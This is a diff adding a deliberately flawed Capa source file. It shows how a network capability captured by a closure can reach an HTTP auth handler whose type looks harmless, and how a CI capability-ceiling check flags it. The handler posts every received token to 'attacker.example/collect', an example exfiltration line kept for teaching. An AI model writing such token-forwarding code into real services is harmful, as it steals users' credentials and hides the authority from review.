@@ -1,0 +1,122 @@
+// leaky_handler.capa
+//
+// COUNTER-EXAMPLE NUMBER TWO, and the one that is specific to the
+// SERVICE. It is not imported by anything.
+//
+// leaky_verify.capa shows the crude leak: a pure function reaching for
+// a `Net` it was never given. The compiler stops that at the call site,
+// because a capability has no constructor.
+//
+// A service has a subtler route, and it is worth being precise about
+// where Capa does and does not stop it. `capa_server`'s handler type is
+// `Fun(Request) -> Response`, so a handler CANNOT declare a capability
+// parameter: the type has no room for one. But a handler is a CLOSURE,
+// and a closure captures its lexical environment, and Capa lets a
+// capability be captured. So authority CAN ride into a handler that
+// looks, from its type, entirely inert. That is what this file does.
+//
+// THIS FILE COMPILES. `capa --check leaky_handler.capa` reports `ok`,
+// and it is meant to: nothing here forges authority. `main` was handed
+// a `Net`, and passing what you legitimately hold to a closure you
+// legitimately build is ordinary code. The type of the handler is
+// still `Fun(Request) -> Response`; reading it tells you nothing.
+//
+// AND THE INFORMATION-FLOW WARNING DOES NOT CATCH IT EITHER. `--check`
+// does emit one here, that a secret closure reaches `serve_once`, but
+// it is the SAME warning service.capa gets for the innocent reason
+// that its handler captures the HMAC key read from `env.get`. The
+// warning is about the closure being labelled secret, not about what
+// the closure does with a `Net`. Do not read it as the leak being
+// found; if it were the check that mattered, one `declassify` would
+// silence it, exactly as service.capa's does.
+//
+// What stops it is a different mechanism, one level up:
+//
+//     capa --check-capabilities leaky_handler.capa
+//
+//     capa: --check-capabilities: FAILED - 1 ceiling violation(s):
+//       - package 'capa_authgate' declares max=['Clock', 'Env',
+//         'Random', 'Serve', 'Stdio'] but its own code introduces 'Net'
+//
+// while `capa --check-capabilities service.capa` reports OK, because
+// the gate composes from the entry point it is given.
+//
+// The authority could not hide in the closure, because it could not
+// get INTO the closure without `main` declaring it, and `main`'s
+// declaration is the package's authority. `capa --manifest` shows the
+// same thing at function granularity: this `main` reports
+// {Serve, Env, Clock, Net} where service.capa's reports
+// {Serve, Env, Clock}, and the extra word is the whole leak.
+//
+// So the two counter-examples are two different guarantees:
+//
+//   leaky_verify.capa   the compiler REFUSES to let a pure function
+//                       obtain authority. A type-level fact.
+//   leaky_handler.capa  a CI gate refuses a program whose declared
+//                       authority exceeds what it promised. A
+//                       product-level fact, and the one that matters
+//                       when the leak is legal code that simply asks
+//                       for more than it should.
+//
+// Neither is a promise about the implementation. Both are checks that
+// run without reading it.
+
+import authgate
+import capa_base64.base64
+import capa_server.request
+import capa_server.response
+import capa_server.serve
+
+// WRONG: a handler that mirrors every token it is shown to an
+// attacker before answering. The `net` is CAPTURED, not declared: the
+// function value this becomes still has type `Fun(Request) -> Response`.
+fun leaky_handle(net: Net, r: Request, key: List<Int>, now_secs: Int) -> Response
+    let token = match ascii_string_of(r.body)
+        Some(t) -> t
+        None    -> ""
+
+    // The exfiltration. Nothing about the handler's TYPE reveals it.
+    match net.post("https://attacker.example/collect", token)
+        Ok(_)  -> ()
+        Err(_) -> ()
+
+    return match verify_token(token, key, now_secs)
+        Ok(claims) -> text_response(200, claims)
+        Err(e)     -> text_response(401, auth_error_message(e))
+
+// Body bytes as text, in the crudest possible way; this file is not
+// trying to be a good server.
+fun ascii_string_of(body: List<Int>) -> Option<String>
+    var out = ""
+    for b in body
+        if b < 0x20 or b > 0x7E
+            return None
+        out = "${out}${b}"
+    return Some(out)
+
+// The leak's real cost is HERE, in the signature: this `main` must
+// declare `Net` to have one to capture, and that word is what both
+// `capa --manifest` and `capa --check-capabilities` read.
+pub fun main(serve: Serve, env: Env, clock: Clock, net: Net)
+    let key = match env.get("AUTHGATE_KEY")
+        Some(k) -> match decode(k)
+            Ok(bytes) -> bytes
+            Err(_)    -> []
+        None -> []
+
+    let listener = serve.restrict_to("127.0.0.1:8080")
+    match listener.listen("127.0.0.1", 8080)
+        Ok(_)  -> ()
+        Err(_) -> return
+
+    match listener.accept()
+        Err(_)   -> ()
+        Ok(conn) ->
+            let now = to_int(clock.now_secs())
+            // `net` rides in through the closure. The handler's type is
+            // unchanged and says nothing.
+            let handler = fun (r: Request) -> Response => leaky_handle(net, r, key, now)
+            let _ = serve_once(listener, conn, default_config(), handler)
+            let _ = listener.close(conn)
+
+    let _ = listener.stop()
